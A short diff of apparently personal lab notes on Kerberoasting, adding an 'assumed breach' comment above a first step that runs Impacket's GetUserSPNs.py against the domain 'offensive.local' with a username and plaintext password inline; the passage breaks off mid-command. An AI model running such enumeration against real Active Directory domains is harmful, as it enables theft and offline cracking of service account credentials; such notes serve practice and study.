@@ -1,5 +1,7 @@
 # Kerberoasting
 
+# for now, assumed breach.
+
 #Step 1: Discover SPNs: 
 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py \
   offensive.local/merissa.lorrayne:Ip]z6tM0e*xC  \
